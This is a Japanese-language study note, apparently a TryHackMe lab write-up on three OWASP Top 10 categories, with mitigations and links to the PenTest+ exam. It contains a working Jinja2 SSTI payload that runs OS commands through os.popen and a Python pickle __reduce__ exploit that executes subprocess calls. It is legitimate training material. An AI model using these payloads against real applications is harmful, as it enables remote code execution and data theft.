# OWASP Top 10 (2025)

## 概要
OWASP Top 10 (2025)の中から3つの脆弱性カテゴリを学ぶルーム。
アプリケーションの動作とユーザー入力に関連する脆弱性を実践形式で学習。

- **カテゴリ**: Web Application Security
- **完了日**: 2026年4月9日

---

## 学んだ技術・攻撃手法

### 1. A04: Cryptographic Failures（Task 2）
**概要**: 暗号化の失敗により機密データが保護されない脆弱性

**問題点**:
- 弱い暗号化アルゴリズム（MD5, SHA1, DES）の使用
- 短いキーによるXOR暗号（ブルートフォース可能）
- ハッシュ化なしのパスワード保存
- 暗号化キーのソースコードへの埋め込み

**対策**:
- bcrypt, scrypt, Argon2などの強力なハッシュ関数を使用
- AES-256-GCMなどの業界標準暗号化を使用
- キー管理システムを利用してシークレットを管理

### 2. A05: Injection（Task 3）
**概要**: ユーザー入力が適切にサニタイズされずコマンドやクエリとして実行される脆弱性

**種類**:
- SQL Injection
- Command Injection
- AI Prompts Injection
- **Server Side Template Injection (SSTI)**

**SSTI（Jinja2）の仕組み**:
- ユーザー入力がテンプレートエンジンに渡されてサーバー側で実行される
- Pythonオブジェクトへのアクセスが可能
- OSコマンドの実行が可能

**対策**:
- ユーザー入力を常に信頼しない
- プリペアドステートメントを使用
- 入力のバリデーションとサニタイズ
- OSコマンドを直接呼び出す関数を避ける

### 3. A08: Software or Data Integrity Failures（Task 4）
**概要**: アプリケーションが整合性を検証せずにコード、更新、データを信頼する脆弱性

**問題点**:
- 署名や整合性検証なしにシリアライズされたデータを受け入れる
- Pythonのpickleモジュールによる任意コード実行
- 信頼されていないソースからのスクリプト読み込み

**Pickleデシリアライゼーション攻撃**:
- `__reduce__`メソッドをオーバーライドして任意のコードを実行
- base64エンコードされたペイロードをアプリに送信

**対策**:
- 安全なシリアライズ形式（JSON, YAML with safe_load）を使用
- デジタル署名で整合性を検証
- 許可されたオブジェクト型のホワイトリスト
- 制限付きUnpicklerを使用

---

## 使用したコマンド・ペイロード

### A04: XOR暗号ブルートフォース
```
# 4文字のキーを手動で総当たり
# ヒント：最初の3文字が判明している場合、4文字目のみ試す
KEY0, KEY1, KEY2, ... KEY9, KEYa, KEYb, ...
```

### A05: SSTI（Jinja2）ペイロード
```python
# 動作確認
{{7*7}}  # 49が返ればSSTI脆弱性あり

# ファイル読み取り
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}

# 設定情報の確認
{{config.items()}}
```

### A08: Pickleデシリアライゼーション攻撃
```python
import pickle, subprocess, base64

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat', 'flag.txt'],))

# base64エンコードしてアプリに送信
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

---

## 取得したフラグ

| Task | フラグ |
|---|---|
| Task 2 (Cryptographic Failures) | `THM{WEAK_CRYPTO_FLAG}` |
| Task 3 (Injection/SSTI) | `THM{SSTI_FLAG_OBTAINED}` |
| Task 4 (Deserialization) | `THM{INSECURE_DESERIALIZATION}` |

---

## PT0-003との関連

| 試験ドメイン | 関連技術 |
|---|---|
| Vulnerability Discovery | OWASP Top 10の識別と分類 |
| Attacks & Exploits | SQLi, Command Injection, SSTI |
| Reporting | OWASP分類に基づく脆弱性報告 |

### 重要ポイント
- **XOR暗号**は短いキーの場合ブルートフォースが容易
- **SSTI**はテンプレートエンジンの種類（Jinja2, Twig, Freemarker等）によってペイロードが異なる
- **Pickleデシリアライゼーション**は`__reduce__`メソッドで任意コード実行が可能
- OWASPはWebアプリセキュリティの**共通言語**としてPenTest+試験でも頻出

---

## 参考リンク
- [TryHackMe - OWASP Top 10](https://tryhackme.com/room/owasptop102021)
- [OWASP Top 10 2025](https://owasp.org/www-project-top-ten/)
- [SSTI CheatSheet - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [Pickle Security](https://docs.python.org/3/library/pickle.html#restricting-globals)
